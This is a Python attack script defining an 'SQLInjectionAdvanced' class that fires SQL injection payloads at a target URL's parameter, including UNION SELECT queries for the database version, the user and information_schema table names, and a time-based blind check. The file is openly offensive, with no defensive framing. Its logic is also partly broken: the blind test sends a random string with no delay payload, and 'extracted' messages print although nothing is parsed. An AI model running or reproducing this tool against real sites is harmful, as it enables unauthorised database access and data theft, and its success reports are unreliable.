import requests
import random
import string
import time

class SQLInjectionAdvanced:
    def __init__(self, target_url, vulnerable_param, headers=None):
        self.target_url = target_url
        self.vulnerable_param = vulnerable_param
        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}
        self.db_info = {}

    def generate_payload(self, length=12):
        """
        Generate a random string for SQL injection payload.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def error_based_injection(self, payload):
        """
        Try error-based SQL injection to extract information from the database.
        """
        sql_error_payload = f"{self.vulnerable_param}={payload}'"
        url = f"{self.target_url}?{sql_error_payload}"

        try:
            response = requests.get(url, headers=self.headers)
            if "error" in response.text or "mysql" in response.text.lower():
                print(f"Error-based SQL injection successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during error-based injection: {e}")
        return False

    def blind_sql_injection(self, payload):
        """
        Perform blind SQL injection by checking response time or page content.
        """
        sql_blind_payload = f"{self.vulnerable_param}={payload}'"
        url = f"{self.target_url}?{sql_blind_payload}"

        try:
            start_time = time.time()
            response = requests.get(url, headers=self.headers)
            end_time = time.time()
            if (end_time - start_time) > 2:  # Long delay indicates successful injection
                print(f"Blind SQL injection successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during blind SQL injection: {e}")
        return False

    def extract_db_info(self):
        """
        Try extracting database version, user, and tables using SQL injection.
        """
        # Extract Database Version
        payload = "1' UNION SELECT NULL, VERSION(), NULL--"
        if self.error_based_injection(payload):
            print("Database version extracted using error-based injection.")

        # Extract Database User
        payload = "1' UNION SELECT NULL, USER(), NULL--"
        if self.error_based_injection(payload):
            print("Database user extracted using error-based injection.")

        # Extract Tables
        payload = "1' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables--"
        if self.error_based_injection(payload):
            print("Database tables extracted using error-based injection.")

    def automated_attack(self):
        """
        Execute SQL Injection attack with both error-based and blind SQL injection techniques.
        """
        print(f"Launching SQL Injection attack on {self.target_url} targeting parameter: {self.vulnerable_param}")
        
        # Blind SQL Injection attack
        payload = self.generate_payload()
        if self.blind_sql_injection(payload):
            print("Successfully exploited blind SQL injection.")

        # Error-based SQL Injection attack
        self.extract_db_info()

    def run_attack(self):
        """
        Run the attack with a more sophisticated approach.
        """
        self.automated_attack()
